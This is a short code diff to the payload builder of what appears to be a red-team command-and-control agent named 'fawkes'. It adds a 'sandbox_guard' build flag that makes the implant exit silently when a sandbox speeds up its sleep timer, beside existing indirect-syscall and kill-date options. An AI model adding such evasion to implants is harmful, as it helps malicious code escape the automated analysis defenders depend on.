@@ -220,6 +220,13 @@ var payloadDefinition = agentstructs.PayloadType{
 			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
 		},
 		{
+			Name:          "sandbox_guard",
+			Description:   "Detect sandbox time-acceleration (sleep skipping). If the agent's sleep is fast-forwarded by a sandbox, it exits silently. Prevents execution in automated analysis environments.",
+			Required:      false,
+			DefaultValue:  false,
+			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
+		},
+		{
 			Name:          "kill_date",
 			Description:   "Optional: UTC date/time after which the agent will self-terminate (format: YYYY-MM-DD or YYYY-MM-DD HH:MM). Leave empty for no kill date. Enforced every tasking cycle.",
 			Required:      false,
@@ -417,6 +424,9 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 	}
 	if indSyscalls, err := payloadBuildMsg.BuildParameters.GetBooleanArg("indirect_syscalls"); err == nil && indSyscalls {
 		ldflags += fmt.Sprintf(" -X '%s.indirectSyscalls=true'", fawkes_main_package)
+	}
+	if sbGuard, err := payloadBuildMsg.BuildParameters.GetBooleanArg("sandbox_guard"); err == nil && sbGuard {
+		ldflags += fmt.Sprintf(" -X '%s.sandboxGuard=true'", fawkes_main_package)
 	}
 
 	// Kill date: parse date string to Unix timestamp
